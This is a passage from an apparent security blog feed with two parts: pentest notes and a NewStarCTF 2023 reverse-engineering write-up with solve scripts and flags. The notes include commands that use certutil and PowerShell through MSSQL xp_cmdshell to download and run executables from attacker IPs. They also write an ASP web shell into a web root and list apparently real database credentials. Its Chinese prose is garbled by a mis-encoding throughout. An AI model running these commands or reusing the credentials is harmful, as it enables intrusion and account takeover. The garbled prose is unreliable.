CVEs )=====<br>In order to test for CVEs, download lse.sh from the GitHub releases page.<br>Alternatively, build lse_cve.sh using tools/package_cvs_into_lse.sh from the repository.</p><p>==================================( FINISHED )==================================<br>$ lxc init ubuntu: ignite -c security.privileged=true</p><p>certutil -urlcache -split -f <a href="http://192.168.144.129/beacon.exe">http://192.168.144.129/beacon.exe</a> C:\xxx.exe</p><p>iptables -A PREROUTING -p tcp -d 192.168.111.131 â€“dport 822 -j DNAT â€“to-destination 192.168.1.88:8080</p><p>iptables -A POSTROUTING -p tcp -d 192.168.1.88 â€“dport 8080 -j SNAT â€“to-source 192.168.111.131</p><p>define(â€˜DB_HOSTâ€™, â€˜localhostâ€™); //æ•°æ®åº“æœåŠ¡å™¨åœ°å€<br>define(â€˜DB_USERâ€™, â€˜fk_huoxingtu_cnâ€™);  //æ•°æ®åº“ç”¨æˆ·å<br>define(â€˜DB_PWDâ€™, â€˜haK6eF4jxw3YKDEWâ€™);//æ•°æ®åº“å¯†ç <br>define(â€˜DB_NAMEâ€™, â€˜fk_huoxingtu_cnâ€™);  //æ•°æ®åº“åç§°<br>define(â€˜DB_PORTâ€™, â€˜3306â€™);  //æ•°æ®åº“ç«¯å£</p><p>define(â€˜IN_DBHOSTâ€™, â€˜127.0.0.1â€™);<br>define(â€˜IN_DBUSERâ€™, â€˜fenfaâ€™);<br>define(â€˜IN_DBPWâ€™, â€˜yEAnzRb6dMMBtZ47â€™);<br>define(â€˜IN_DBNAMEâ€™, â€˜fenfaâ€™);</p><p>execute master..xp_dirtree â€˜c:â€™,1,1</p><p>exec master..xp_cmdshell â€˜net userâ€™ ;<br>bitsadmin /transfer n <a href="https://www.baidu.com/robots.txt">https://www.baidu.com/robots.txt</a> c:a.txt<br>c:\users\Administrator\desktop\a.txt</p><p>declare @o int, @f int, @t int, @ret int<br>exec sp_oacreate â€˜scripting.filesystemobjectâ€™, @o out<br>exec sp_oamethod @o, â€˜createtextfileâ€™, @f out, â€˜c:\inetpub\wwwroot\s.jspâ€™, 1<br>exec @ret = sp_oamethod @f, â€˜writelineâ€™, NULL,â€™&lt;%execute(request(â€œaâ€))%&gt;â€™</p><p>exec master..xp_cmdshell â€˜â€œecho $client = New-Object System.Net.WebClient &gt; %TEMP%\test.ps1 &amp; echo $client.DownloadFile(â€œ<a href="http://example/test0.exe&quot;,&quot;%TEMP%/test.exe&quot;">http://example/test0.exe&quot;,&quot;%TEMP%\test.exe&quot;</a>) &gt;&gt; %TEMP%\test.ps1 &amp; powershell  -ExecutionPolicy Bypass  %temp%\test.ps1 &amp; WMIC process call create â€œ%TEMP%\test.exeâ€â€â€˜</p><p>declare @o int, @f int, @t int, @ret int<br>exec sp_oacreate â€˜scripting.filesystemobjectâ€™, @o out<br>exec sp_oamethod @o, â€˜createtextfileâ€™, @f out, â€˜C:\inetpub\wwwroot\s.jspâ€™, 1<br>exec @ret = sp_oamethod @f, â€˜writelineâ€™, NULL,â€™&lt;%execute(request(â€œaâ€))%&gt;â€™<br>exec master..xp_cmdshell â€˜dir c:\inetpub\wwwroot&#39; ;</p><p>exec master..xp_cmdshell â€˜â€œecho $client = New-Object System.Net.WebClient &gt; %TEMP%\test.ps1 &amp; echo $client.DownloadFile(â€œ<a href="http://ip/chunqiu.exe&quot;,&quot;%TEMP%/test.exe&quot;">http://ip/chunqiu.exe&quot;,&quot;%TEMP%\test.exe&quot;</a>) &gt;&gt; %TEMP%\test.ps1 &amp; powershell  -ExecutionPolicy Bypass  %temp%\test.ps1 &amp; WMIC process call create â€œ%TEMP%\test.exeâ€â€â€˜</p><p>certutil -urlcache -split -f <a href="http://ip/chunqiu.exe">http://ip/chunqiu.exe</a> c:\a.exe</p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>NewStarCTF2023å…¬å¼€èµ›é“WEEK2</title>
      <link href="/2023/11/13/NewStarCTF2023%E5%85%AC%E5%BC%80%E8%B5%9B%E9%81%93WEEK2/NewStarCTF2023%E5%85%AC%E5%BC%80%E8%B5%9B%E9%81%93WEEK2/"/>
      <url>/2023/11/13/NewStarCTF2023%E5%85%AC%E5%BC%80%E8%B5%9B%E9%81%93WEEK2/NewStarCTF2023%E5%85%AC%E5%BC%80%E8%B5%9B%E9%81%93WEEK2/</url>
      
        <content type="html"><![CDATA[<h3 id="NewStarCTF-2023-å…¬å¼€èµ›é“-WEEK2"><a href="#NewStarCTF-2023-å…¬å¼€èµ›é“-WEEK2" class="headerlink" title="NewStarCTF 2023 å…¬å¼€èµ›é“ WEEK2"></a>NewStarCTF 2023 å…¬å¼€èµ›é“ WEEK2</h3><h4 id="REVERSE"><a href="#REVERSE" class="headerlink" title="REVERSE"></a>REVERSE</h4><h5 id="WEEK2-REVERSE-PZthon"><a href="#WEEK2-REVERSE-PZthon" class="headerlink" title="WEEK2|REVERSE PZthon"></a>WEEK2|REVERSE PZthon</h5><p><img src="/images/xinshengsai/image-20231113141154075.png" alt="image-20231113141154075"></p><p>ä¸‹è½½æ–‡ä»¶ï¼Œçœ‹èµ·æ¥åƒæ˜¯pyæ–‡ä»¶ï¼Œpyæ–‡ä»¶çš„è¯æ‹–idaæ˜¯ä¸è¡Œçš„ï¼Œè‡³äºä¸ºä»€ä¹ˆä¸è¡Œï¼Œæˆ‘ä¹Ÿä¸çŸ¥é“ï¼Œå¤§ä½¬è¯´çš„ï¼Œ</p><p><img src="/images/xinshengsai/image-20231113141300930.png" alt="image-20231113141300930"></p><p>æ‹–åˆ°idaé‡Œï¼Œä¹Ÿä¸è¡Œï¼Œå¤ªå¤šä¸œè¥¿äº†ã€‚</p><p><code>https://github.com/extremecoders-re/pyinstxtractor</code></p><p>å¯ä»¥ä½¿ç”¨è¿™ä¸ªpython exe åç¼–è¯‘å·¥å…·è¿›è¡Œåç¼–è¯‘ï¼Œ</p><p><code>python3 .\pyinstxtractor.py ..\PZthon\PZthon.exe</code></p><p>è§£å‡ºæ¥ä¹‹åä¼šçœ‹åˆ°è¿™ä¸ªæ–‡ä»¶åçš„ä»¥pycä¸ºåç¼€çš„æ–‡ä»¶ï¼Œæ‹¿åˆ°è¿™ä¸ªpycåç¼–è¯‘çš„ç½‘ç«™ï¼Œ<code>https://tool.lu/pyc/</code></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="comment"># visit https://tool.lu/pyc/ for more information</span></span><br><span class="line"><span class="comment"># Version: Python 3.9</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">hello</span>():</span></span><br><span class="line">    art = <span class="string">&#x27;\n              ___                                                                      \n    //   ) )     / /    //   ) )  // | |     / /        // | |  \\ / / \\    / /       \n   //___/ /     / /    //        //__| |    / /        //__| |   \\  /   \\  / /        \n  / ____ /     / /    //  ____  / ___  |   / /        / ___  |   / /     \\/ /         \n //           / /    //    / / //    | |  / /        //    | |  / /\\     / /          \n//           / /___ ((____/ / //     | | / /____/ / //     | | / /  \\   / /           \n                                                                                       \n     / /        //   / / ||   / / //   / /  / /       /__  ___/ ||   / |  / / //   ) ) \n    / /        //____    ||  / / //____    / /          / /     ||  /  | / / //   / /  \n   / /        / ____     || / / / ____    / /          / /      || / /||/ / //   / /   \n  / /        //          ||/ / //        / /          / /       ||/ / |  / //   / /    \n / /____/ / //____/ /    |  / //____/ / / /____/ /   / /        |  /  | / ((___/ /     \n&#x27;</span></span><br><span class="line">    <span class="built_in">print</span>(art)</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">bytearray</span>(<span class="built_in">input</span>(<span class="string">&#x27;Please give me the flag: &#x27;</span>).encode())</span><br><span class="line"></span><br><span class="line">enc = [</span><br><span class="line">    <span class="number">115</span>,</span><br><span class="line">    <span class="number">121</span>,</span><br><span class="line">    <span class="number">116</span>,</span><br><span class="line">    <span class="number">114</span>,</span><br><span class="line">    <span class="number">110</span>,</span><br><span class="line">    <span class="number">76</span>,</span><br><span class="line">    <span class="number">37</span>,</span><br><span class="line">    <span class="number">96</span>,</span><br><span class="line">    <span class="number">88</span>,</span><br><span class="line">    <span class="number">116</span>,</span><br><span class="line">    <span class="number">113</span>,</span><br><span class="line">    <span class="number">112</span>,</span><br><span class="line">    <span class="number">36</span>,</span><br><span class="line">    <span class="number">97</span>,</span><br><span class="line">    <span class="number">65</span>,</span><br><span class="line">    <span class="number">125</span>,</span><br><span class="line">    <span class="number">103</span>,</span><br><span class="line">    <span class="number">37</span>,</span><br><span class="line">    <span class="number">96</span>,</span><br><span class="line">    <span class="number">114</span>,</span><br><span class="line">    <span class="number">125</span>,</span><br><span class="line">    <span class="number">65</span>,</span><br><span class="line">    <span class="number">39</span>,</span><br><span class="line">    <span class="number">112</span>,</span><br><span class="line">    <span class="number">70</span>,</span><br><span class="line">    <span class="number">112</span>,</span><br><span class="line">    <span class="number">118</span>,</span><br><span class="line">    <span class="number">37</span>,</span><br><span class="line">    <span class="number">123</span>,</span><br><span class="line">    <span class="number">113</span>,</span><br><span class="line">    <span class="number">69</span>,</span><br><span class="line">    <span class="number">79</span>,</span><br><span class="line">    <span class="number">82</span>,</span><br><span class="line">    <span class="number">84</span>,</span><br><span class="line">    <span class="number">89</span>,</span><br><span class="line">    <span class="number">84</span>,</span><br><span class="line">    <span class="number">77</span>,</span><br><span class="line">    <span class="number">76</span>,</span><br><span class="line">    <span class="number">36</span>,</span><br><span class="line">    <span class="number">112</span>,</span><br><span class="line">    <span class="number">99</span>,</span><br><span class="line">    <span class="number">112</span>,</span><br><span class="line">    <span class="number">36</span>,</span><br><span class="line">    <span class="number">65</span>,</span><br><span class="line">    <span class="number">39</span>,</span><br><span class="line">    <span class="number">116</span>,</span><br><span class="line">    <span class="number">97</span>,</span><br><span class="line">    <span class="number">36</span>,</span><br><span class="line">    <span class="number">102</span>,</span><br><span class="line">    <span class="number">86</span>,</span><br><span class="line">    <span class="number">37</span>,</span><br><span class="line">    <span class="number">37</span>,</span><br><span class="line">    <span class="number">36</span>,</span><br><span class="line">    <span class="number">104</span>]</span><br><span class="line">data = hello()</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(data)):</span><br><span class="line">    data[i] = data[i] ^ <span class="number">21</span></span><br><span class="line"><span class="keyword">if</span> <span class="built_in">bytearray</span>(enc) == data:</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;WOW!!&#x27;</span>)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;I believe you can do it!&#x27;</span>)</span><br><span class="line"><span class="built_in">input</span>(<span class="string">&#x27;To be continue...&#x27;</span>)</span><br><span class="line"><span class="comment">#ä»£ç å¾ˆç®€å•ï¼Œå°±æ˜¯ä½ è¾“å…¥çš„çš„è‡³äº¦æˆ–21ä¸encæ¯”è¾ƒï¼Œé‚£æˆ‘ä»¬ç›´æ¥äº¦æˆ–å›æ¥å³å¯</span></span><br><span class="line"><span class="comment">#poc:</span></span><br><span class="line">enc = [</span><br><span class="line">    <span class="number">115</span>,</span><br><span class="line">    <span class="number">121</span>,</span><br><span class="line">    <span class="number">116</span>,</span><br><span class="line">    <span class="number">114</span>,</span><br><span class="line">    <span class="number">110</span>,</span><br><span class="line">    <span class="number">76</span>,</span><br><span class="line">    <span class="number">37</span>,</span><br><span class="line">    <span class="number">96</span>,</span><br><span class="line">    <span class="number">88</span>,</span><br><span class="line">    <span class="number">116</span>,</span><br><span class="line">    <span class="number">113</span>,</span><br><span class="line">    <span class="number">112</span>,</span><br><span class="line">    <span class="number">36</span>,</span><br><span class="line">    <span class="number">97</span>,</span><br><span class="line">    <span class="number">65</span>,</span><br><span class="line">    <span class="number">125</span>,</span><br><span class="line">    <span class="number">103</span>,</span><br><span class="line">    <span class="number">37</span>,</span><br><span class="line">    <span class="number">96</span>,</span><br><span class="line">    <span class="number">114</span>,</span><br><span class="line">    <span class="number">125</span>,</span><br><span class="line">    <span class="number">65</span>,</span><br><span class="line">    <span class="number">39</span>,</span><br><span class="line">    <span class="number">112</span>,</span><br><span class="line">    <span class="number">70</span>,</span><br><span class="line">    <span class="number">112</span>,</span><br><span class="line">    <span class="number">118</span>,</span><br><span class="line">    <span class="number">37</span>,</span><br><span class="line">    <span class="number">123</span>,</span><br><span class="line">    <span class="number">113</span>,</span><br><span class="line">    <span class="number">69</span>,</span><br><span class="line">    <span class="number">79</span>,</span><br><span class="line">    <span class="number">82</span>,</span><br><span class="line">    <span class="number">84</span>,</span><br><span class="line">    <span class="number">89</span>,</span><br><span class="line">    <span class="number">84</span>,</span><br><span class="line">    <span class="number">77</span>,</span><br><span class="line">    <span class="number">76</span>,</span><br><span class="line">    <span class="number">36</span>,</span><br><span class="line">    <span class="number">112</span>,</span><br><span class="line">    <span class="number">99</span>,</span><br><span class="line">    <span class="number">112</span>,</span><br><span class="line">    <span class="number">36</span>,</span><br><span class="line">    <span class="number">65</span>,</span><br><span class="line">    <span class="number">39</span>,</span><br><span class="line">    <span class="number">116</span>,</span><br><span class="line">    <span class="number">97</span>,</span><br><span class="line">    <span class="number">36</span>,</span><br><span class="line">    <span class="number">102</span>,</span><br><span class="line">    <span class="number">86</span>,</span><br><span class="line">    <span class="number">37</span>,</span><br><span class="line">    <span class="number">37</span>,</span><br><span class="line">    <span class="number">36</span>,</span><br><span class="line">    <span class="number">104</span>]</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(enc)):</span><br><span class="line">    enc[i] = enc[i] ^ <span class="number">21</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(enc)):</span><br><span class="line">    <span class="built_in">print</span>(<span class="built_in">chr</span>(enc[i]),end=<span class="string">&quot;&quot;</span>)</span><br><span class="line"><span class="comment">#flag&#123;Y0uMade1tThr0ughT2eSec0ndPZGALAXY1eve1T2at1sC001&#125;</span></span><br></pre></td></tr></table></figure><h5 id="WEEK2-REVERSE-AndroGenshin"><a href="#WEEK2-REVERSE-AndroGenshin" class="headerlink" title="WEEK2|REVERSE AndroGenshin"></a>WEEK2|REVERSE AndroGenshin</h5><p>emmm ï¼Œç ”ç©¶äº†ä¸€ä¸‹åˆï¼Œï¼Œæœ¬æ¥apkä»¥å‰éƒ½æ˜¯æ‹–åˆ°Androidkillé‡Œï¼Œä½†æ˜¯æœ‰æ—¶å€™ï¼Œå¤§çš„apkä¼šå¡ä½ï¼Œæå–ä¸åˆ°æºç ï¼Œä¸æ˜¯æ‰“reçš„ï¼Œä¹Ÿå°±æ²¡æœ‰æ•´è¿‡apkç¯å¢ƒï¼Œ</p><p>è¿™é‡Œç®€å•çš„è§£é‡Šä¸€ä¸‹é€†å‘ç¯å¢ƒçš„é—®é¢˜ï¼Œ</p><p><code>dex2jar-2.0</code> æ˜¯é€†å‘çš„  å…ˆæŠŠapkæ”¹æˆzip,ç„¶åé€‰æ‹©dexé‡Œé¢çš„ç”¨dex2jaré€†æˆjar,ç„¶åå†ç”¨jdguiæ‰“å¼€ï¼Œå¾ˆéº»çƒ¦ï¼Œè€Œä¸”ä¸æ˜¯å¾ˆå‡†ï¼Œè¿˜æ˜¯jdxå¥½ç”¨ï¼Œguiçš„ï¼Œç›´æ¥æ‹–apkå³å¯ï¼Œé€‚åˆæˆ‘è¿™ç§èœé¸¡ã€‚ä¸‹è½½åœ°å€<code>https://github.com/skylot/jadx</code></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">    <span class="keyword">if</span> (!username.equals(<span class="string">&quot;genshinimpact&quot;</span>)) &#123; <span class="comment">//username = genshinimpact</span></span><br><span class="line">        Toast.makeText(MainActivity.<span class="keyword">this</span>, (<span class="keyword">int</span>) R.string.wrong1, <span class="number">0</span>).show();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">int</span>[] base64_table = &#123;<span class="number">125</span>, <span class="number">239</span>, <span class="number">101</span>, <span class="number">151</span>, <span class="number">77</span>, <span class="number">163</span>, <span class="number">163</span>, <span class="number">110</span>, <span class="number">58</span>, <span class="number">230</span>, <span class="number">186</span>, <span class="number">206</span>, <span class="number">84</span>, <span class="number">84</span>, <span class="number">189</span>, <span class="number">193</span>, <span class="number">30</span>, <span class="number">63</span>, <span class="number">104</span>, <span class="number">178</span>, <span class="number">130</span>, <span class="number">211</span>, <span class="number">164</span>, <span class="number">94</span>, <span class="number">75</span>, <span class="number">16</span>, <span class="number">32</span>, <span class="number">33</span>, <span class="number">193</span>, <span class="number">160</span>, <span class="number">120</span>, <span class="number">47</span>, <span class="number">30</span>, <span class="number">127</span>, <span class="number">157</span>, <span class="number">66</span>, <span class="number">163</span>, <span class="number">181</span>, <span class="number">177</span>, <span class="number">47</span>, <span class="number">0</span>, <span class="number">236</span>, <span class="number">106</span>, <span class="number">107</span>, <span class="number">144</span>, <span class="number">231</span>, <span class="number">250</span>, <span class="number">16</span>, <span class="number">36</span>, <span class="number">34</span>, <span class="number">91</span>, <span class="number">9</span>, <span class="number">188</span>, <span class="number">81</span>, <span class="number">5</span>, <span class="number">241</span>, <span class="number">235</span>, <span class="number">3</span>, <span class="number">54</span>, <span class="number">150</span>, <span class="number">40</span>, <span class="number">119</span>, <span class="number">202</span>, <span class="number">150</span>&#125;;</span><br><span class="line">    String retval = it_is_not_RC4.rc4(username, base64_table);</span><br><span class="line">    String result2 = it_is_not_base64.encode(password.getBytes(), retval);</span><br><span class="line">    <span class="keyword">if</span> (!result2.equals(<span class="string">&quot;YnwgY2txbE8TRyQecyE1bE8DZWMkMiRgJW1=&quot;</span>)) &#123;</span><br><span class="line">        Toast.makeText(MainActivity.<span class="keyword">this</span>, (<span class="keyword">int</span>) R.string.wrong2, <span class="number">0</span>).show();</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    Toast.makeText(MainActivity.<span class="keyword">this</span>, (<span class="keyword">int</span>) R.string.Congratulate, <span class="number">0</span>).show();</span><br><span class="line">    Intent intent = <span class="keyword">new</span> Intent(MainActivity.<span class="keyword">this</span>, MainActivity2.class);</span><br><span class="line">    MainActivity.<span class="keyword">this</span>.startActivity(intent);</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>è¿™é‡Œçœ‹ä¸€ä¸‹ä»£ç ï¼Œusername ä¸ºkeyï¼Œtableä¸ºå€¼ï¼ŒåŠç”¨it_is_not_RC4ï¼Œé‚£ä¹ˆå°±å¯ä»¥è¾“å‡ºä¸€ä¸‹ï¼Œç”¨javaï¼Œ</p><p><img src="/images/xinshengsai/image-20231117164940894.png" alt="image-20231117164940894"></p><p>å¯ä»¥å¾—åˆ°<code>BADCFEHGJILKNMPORQTSVUXWZYbadcfehgjilknmporqtsvuxwzy1032547698/+</code></p><p>è¿™æ ·ä¸€çŒœåº”è¯¥å°±æ˜¯base64æ¢è¡¨äº†ã€‚</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"><span class="keyword">import</span> string</span><br><span class="line"></span><br><span class="line">str1 = <span class="string">&quot;YnwgY2txbE8TRyQecyE1bE8DZWMkMiRgJW1=&quot;</span></span><br><span class="line"></span><br><span class="line">string1 = <span class="string">&quot;BADCFEHGJILKNMPORQTSVUXWZYbadcfehgjilknmporqtsvuxwzy1032547698/+&quot;</span></span><br><span class="line">string2 = <span class="string">&quot;ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span> (base64.b64decode(str1.translate(<span class="built_in">str</span>.maketrans(string1,string2))))</span><br></pre></td></tr></table></figure><p><img src="/images/xinshengsai/image-20231117165100510.png" alt="image-20231117165100510"></p><h5 id="WEEK2-REVERSE-SMC"><a href="#WEEK2-REVERSE-SMC" class="headerlink" title="WEEK2|REVERSE SMC"></a>WEEK2|REVERSE SMC</h5><p>ç¨‹åºæ˜¯32ä½çš„</p><p><img src="/images/xinshengsai/image-20231120112522517.png" alt="image-20231120112522517">mainå‡½æ•°ä¼ªç ï¼Œ</p><p><img src="/images/xinshengsai/image-20231120104810219.png" alt="image-20231120104810219"><br>ç„¶åæ‰§è¡Œäº†è¿™ä¸ªå‡½æ•°ï¼Œè¿™ä¸ª<br><img src="/images/xinshengsai/image-20231120105442011.png" alt="image-20231120105442011"></p><p>å¾—åˆ°äº†ä¸€ä¸ªresultï¼Œä»–çš„å€¼ç”¨shift+eæ‹‰å‡ºæ¥å°±è¡Œï¼Œ</p><p><img src="/images/xinshengsai/image-20231120162135987.png" alt="image-20231120162135987"></p><p>æ¥ä¸‹æ¥æ˜¯è°ƒè¯•ï¼Œè§£å¯†è¿™ä¸ªå‡½æ•°ã€‚ä¸‹æ–­ç‚¹ï¼Œ</p><p><img src="/images/xinshengsai/image-20231120155232948.png" alt="image-20231120155232948"></p><p>ç›´æ¥é€‰ä¸­å‰é¢çš„ç‚¹ï¼Œç„¶ååœ¨ä¸Šé¢é€‰ä¸­è¿™ä¸ªlocal debuger</p><p><img src="/images/xinshengsai/image-20231120155259699.png" alt="image-20231120155259699"></p><p>è¿è¡Œç‚¹yeså³å¯ï¼Œç„¶åéšä¾¿è¾“å…¥ä¸ªå­—ç¬¦ç¡®å®šï¼Œå°±è¿›å…¥äº†ï¼Œ</p><p><img src="/images/xinshengsai/image-20231120155459409.png" alt="image-20231120155459409"></p><p>è¿™ä¸ªåœ°æ–¹æ˜¯ä¸€ä¸ªé˜²æ­¢debugerçš„åœ°æ–¹ï¼Œæˆ‘åœ¨æˆ‘è¿™ä¸ªidaé‡Œè°ƒè¯•äº†å‡ æ¬¡ï¼Œæˆ‘è¿™é‡Œç›´æ¥å°±zfä¸º1ï¼Œç»•è¿‡è¿™ä¸ªdebugeräº†ï¼Œå¤§ä½¬çš„è§†é¢‘ä¸­ï¼Œéœ€è¦æ”¹ä¸€ä¸‹ç»•è¿‡</p><p><img src="/images/xinshengsai/image-20231120155637467.png" alt="image-20231120155637467"></p><p>å³ä¸Šè§’ä¸­æŠŠzfæ”¹ä¸º1ï¼Œå¤§ä½¬è§£é‡Šè¯´å°±æ˜¯ifåˆ¤æ–­ï¼Œ1å°±æ˜¯ç›´æ¥è¿›å…¥å˜›ï¼Œ</p><p><img src="/images/xinshengsai/image-20231120155949184.png" alt="image-20231120155949184"></p><p>ç„¶åå›åˆ°ä»£ç è¿›è¡Œè§£ç <code>é€‰ä¸­æŒ‰C,ä¹Ÿå°±æ˜¯codeçš„æ„æ€</code>yes</p><p><img src="/images/xinshengsai/image-20231120160055370.png" alt="image-20231120160055370"></p><p>ç„¶åä¼šæŠŠæ–­ç‚¹è¿™å—æ”¹æˆä»£ç </p><p><img src="/images/xinshengsai/image-20231120160134511.png" alt="image-20231120160134511"></p><p>ç„¶åæŒ‰pé”®è®©idaæŠŠè¿™æ®µä»£ç è½¬æ¢æˆå‡½æ•°ï¼Œè¿™æ ·å°±è¿˜æœ‰ä¸€ç‚¹ç‚¹äº†ï¼Œ</p><p><img src="/images/xinshengsai/image-20231120160305351.png" alt="image-20231120160305351"></p><p><img src="/images/xinshengsai/image-20231120160958026.png" alt="image-20231120160958026"></p><p>è¿™æ ·å°±æˆä¸ºäº†ä¸€ä¸ªå‡½æ•°ï¼Œåœ¨æŒ‰tabï¼Œå°±èƒ½çœ‹åˆ°ä»£ç äº†ï¼Œ</p><p><img src="/images/xinshengsai/image-20231120161048660.png" alt="image-20231120161048660"></p><p>å…ˆäº¦æˆ–åœ¨åŠ 5</p><p>poc</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">a = [</span><br><span class="line">    <span class="number">0x7C</span>, <span class="number">0x82</span>, <span class="number">0x75</span>, <span class="number">0x7B</span>, <span class="number">0x6F</span>, <span class="number">0x47</span>, <span class="number">0x61</span>, <span class="number">0x57</span>, <span class="number">0x53</span>, <span class="number">0x25</span>, </span><br><span class="line">  <span class="number">0x47</span>, <span class="number">0x53</span>, <span class="number">0x25</span>, <span class="number">0x84</span>, <span class="number">0x6A</span>, <span class="number">0x27</span>, <span class="number">0x68</span>, <span class="number">0x27</span>, <span class="number">0x67</span>, <span class="number">0x6A</span>, </span><br><span class="line">  <span class="number">0x7D</span>, <span class="number">0x84</span>, <span class="number">0x7B</span>, <span class="number">0x35</span>, <span class="number">0x35</span>, <span class="number">0x48</span>, <span class="number">0x25</span>, <span class="number">0x7B</span>, <span class="number">0x7E</span>, <span class="number">0x6A</span>, </span><br><span class="line">  <span class="number">0x33</span>, <span class="number">0x71</span></span><br><span class="line">];</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> a:</span><br><span class="line">    <span class="built_in">print</span>( <span class="built_in">chr</span>((i - <span class="number">5</span> )^<span class="number">0x11</span>),end=<span class="string">&quot;&quot;</span>)</span><br><span class="line"><span class="comment">#flag&#123;SMC_1S_1nt3r3sting!!R1ght?&#125;</span></span><br></pre></td></tr></table></figure><p>å‚è€ƒï¼š<code>https://www.bilibili.com/video/BV1Cu4y1s7ab/?spm_id_from=333.999.0.0</code></p><h5 id="WEEK2-REVERSE-Petals"><a href="#WEEK2-REVERSE-Petals" class="headerlink" title="WEEK2|REVERSE Petals"></a>WEEK2|REVERSE Petals</h5><p>èŠ±æŒ‡ä»¤</p><p><img src="/images/xinshengsai/image-20231121100726785.png" alt="image-20231121100726785"></p><p><img src="/images/xinshengsai/image-20231121100739187.png" alt="image-20231121100739187"></p><p><code>ç»å…¸èŠ±æŒ‡ä»¤ï¼Œjz jnz  jzä»£è¡¨jump zero ä¸º 0çš„æ—¶å€™è·³è½¬ jnzä»£è¡¨ jump not 